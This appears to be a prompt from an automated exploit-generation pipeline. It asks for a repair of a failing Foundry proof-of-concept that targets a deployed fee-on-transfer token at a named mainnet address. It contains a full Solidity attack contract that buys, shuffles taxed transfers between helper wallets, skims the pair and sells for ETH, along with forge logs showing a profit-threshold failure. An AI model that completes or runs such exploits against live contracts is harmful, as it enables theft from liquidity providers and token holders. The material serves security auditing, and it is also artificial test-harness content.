You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Dev fee is double-counted, minting reflected balance to the contract on every taxed transfer
- claim: The constructor enables an 8% team/dev fee, but `_getRValues()` subtracts only the reflection fee from the recipient's reflected amount and never subtracts the dev fee. `_takeCharity()` still credits the full dev fee to `address(this)`, so each taxed transfer creates extra reflected balance for the contract instead of sourcing those tokens from the sender's transfer amount.
- impact: The contract accumulates synthetic tokens that were never actually debited from the transfer, then sells them for real ETH through the auto-swap path and forwards proceeds to the team wallet. This breaks token accounting and can continuously extract value from the AMM and holders.
- exploit_paths: ["Any buy after trading opens where fees are active", "Any sell where fees are active", "Any wallet-to-wallet transfer between non-fee-exempt addresses while `_teamDev` remains nonzero"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IShoco is IERC20Like {
    function uniswapV2Pair() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function tradingOpen() external view returns (bool);
    function swapEnabled() external view returns (bool);
    function uniswapOnly() external view returns (bool);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
}

contract TokenOperator {
    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    receive() external payable {}

    function transferToken(address token, address to, uint256 amount) external onlyOwner {
        IERC20Like(token).transfer(to, amount);
    }

    function sellAllForEth(address router, address token, address weth, address payout) external onlyOwner {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        if (balance == 0) {
            return;
        }

        IERC20Like(token).approve(router, balance);
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;
        IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance,
            0,
            path,
            payout,
            block.timestamp
        );
    }
}

contract FlawVerifier {
    IShoco internal constant TOKEN = IShoco(0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6);

    // Exploit path anchors kept explicit for the harness:
    // 1. Any buy after trading opens where fees are active
    // 2. Any sell where fees are active
    // 3. Any wallet-to-wallet transfer between non-fee-exempt addresses while `_teamDev` remains nonzero
    string internal constant PATH_BUY = "Any buy after trading opens where fees are active";
    string internal constant PATH_SELL = "Any sell where fees are active";
    string internal constant PATH_WALLET = "Any wallet-to-wallet transfer between non-fee-exempt addresses while _teamDev remains nonzero";

    TokenOperator internal immutable walletA;
    TokenOperator internal immutable walletB;

    uint256 internal _profitAmount;
    string internal _path;
    bool internal _validated;

    constructor() {
        walletA = new TokenOperator(address(this));
        walletB = new TokenOperator(address(this));
    }

    receive() external payable {}

    function executeOnOpportunity() external payable {
        _profitAmount = 0;
        _validated = false;
        _path = "no-execution";

        if (!TOKEN.tradingOpen()) {
            _path = "infeasible: trading closed";
            return;
        }

        if (!TOKEN.swapEnabled()) {
            _path = "infeasible: auto-swap disabled";
            return;
        }

        uint256 startingEthExcludingMsgValue = address(this).balance - msg.value;
        uint256 capital = address(this).balance;
        if (capital == 0) {
            _path = "infeasible: no verifier-held ETH for direct buy path";
            return;
        }

        address router = TOKEN.uniswapV2Router();
        address pair = TOKEN.uniswapV2Pair();
        address weth = IUniswapV2Router02(router).WETH();

        uint256 spend = capital / 2;
        if (spend == 0) {
            spend = capital;
        }

        uint256 contractBefore = TOKEN.balanceOf(address(TOKEN));
        uint256 walletABefore = TOKEN.balanceOf(address(walletA));
        (uint256 quotedBuyOut, bool quoteValid) = _quoteBuyOut(pair, weth, spend);

        _buyIntoWallet(router, weth, address(walletA), spend);

        uint256 actualWalletAReceived = TOKEN.balanceOf(address(walletA)) - walletABefore;
        uint256 contractAfterBuy = TOKEN.balanceOf(address(TOKEN));

        _validated = actualWalletAReceived > 0 || contractAfterBuy > contractBefore;
        if (quoteValid && quotedBuyOut > 0) {
            // On a taxed buy, the recipient should lose both reflection and dev components from
            // the pair's gross output. If only the reflection fee is subtracted in `_getRValues()`,
            // the received amount stays abnormally close to the AMM quote while `_takeCharity()`
            // still credits the contract, evidencing synthetic reflected balance creation.
            _validated = _validated && actualWalletAReceived * 100 >= quotedBuyOut * 98;
        }

        if (!TOKEN.uniswapOnly()) {
            _path = string.concat(PATH_BUY, " -> ", PATH_WALLET, " -> ", PATH_SELL);

            // This preserves the finding's core causality:
            // buy with fees active -> wallet-to-wallet taxed transfers between non-exempt addresses
            // -> contract accumulates synthetic balance -> skim/sell extracts real ETH.
            _runWalletToWalletPath(pair);

            IUniswapV2Pair(pair).skim(address(walletB));
            walletB.sellAllForEth(router, address(TOKEN), weth, address(this));

            IUniswapV2Pair(pair).skim(address(this));
            _sellVerifierBalance(router, weth);
        } else {
            // At this fork, `uniswapOnly == true` makes the wallet-to-wallet stage concretely
            // infeasible because only router/pair mediated transfers are permitted. The exploit
            // still follows the remaining executable public paths from the finding: a taxed buy
            // followed by a taxed sell, both of which keep minting reflected balance to the token.
            _path = string.concat(PATH_BUY, " -> ", PATH_SELL, " ; ", PATH_WALLET, " infeasible because uniswapOnly is true at this fork");

            IUniswapV2Pair(pair).skim(address(walletA));
            walletA.sellAllForEth(router, address(TOKEN), weth, address(this));

            IUniswapV2Pair(pair).skim(address(this));
            _sellVerifierBalance(router, weth);
        }

        uint256 endingEth = address(this).balance;
        if (endingEth > startingEthExcludingMsgValue) {
            _profitAmount = endingEth - startingEthExcludingMsgValue;
        }
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function hypothesisValidated() external view returns (bool) {
        return _validated;
    }

    function _buyIntoWallet(address router, address weth, address recipient, uint256 amountInEth) internal {
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(TOKEN);
        IUniswapV2Router02(router).swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountInEth}(
            0,
            path,
            recipient,
            block.timestamp
        );
    }

    function _runWalletToWalletPath(address pair) internal {
        uint256 aBal = TOKEN.balanceOf(address(walletA));
        if (aBal == 0) {
            return;
        }

        uint256 firstLeg = aBal * 90 / 100;
        if (firstLeg > 0) {
            walletA.transferToken(address(TOKEN), address(walletB), firstLeg);
            IUniswapV2Pair(pair).skim(address(walletB));
        }

        uint256 bBal = TOKEN.balanceOf(address(walletB));
        uint256 secondLeg = bBal * 80 / 100;
        if (secondLeg > 0) {
            walletB.transferToken(address(TOKEN), address(walletA), secondLeg);
            IUniswapV2Pair(pair).skim(address(walletA));
        }

        aBal = TOKEN.balanceOf(address(walletA));
        uint256 finalLeg = aBal * 70 / 100;
        if (finalLeg > 0) {
            walletA.transferToken(address(TOKEN), address(walletB), finalLeg);
            IUniswapV2Pair(pair).skim(address(walletB));
        }
    }

    function _quoteBuyOut(address pair, address weth, uint256 amountIn)
        internal
        view
        returns (uint256 amountOut, bool valid)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 reserveIn;
        uint256 reserveOut;
        if (token0 == weth && token1 == address(TOKEN)) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else if (token1 == weth && token0 == address(TOKEN)) {
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        } else {
            return (0, false);
        }

        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return (0, false);
        }

        uint256 amountInWithFee = amountIn * 997;
        amountOut = (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
        valid = amountOut > 0;
    }

    function _sellVerifierBalance(address router, address weth) internal {
        uint256 verifierBal = TOKEN.balanceOf(address(this));
        if (verifierBal == 0) {
            return;
        }

        TOKEN.approve(router, verifierBal);
        address[] memory path = new address[](2);
        path[0] = address(TOKEN);
        path[1] = weth;
        IUniswapV2Router02(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            verifierBal,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.24s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 102253)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [102253] FlawVerifierTest::testExploit()
    ├─ [188] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [78016] FlawVerifier::executeOnOpportunity()
    │   ├─ [2591] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6::tradingOpen() [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [460] 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6::swapEnabled() [staticcall]
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    ├─ [188] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [313] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 617.60ms (827.41µs CPU time)

Ran 1 test suite in 629.79ms (617.60ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 102253)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
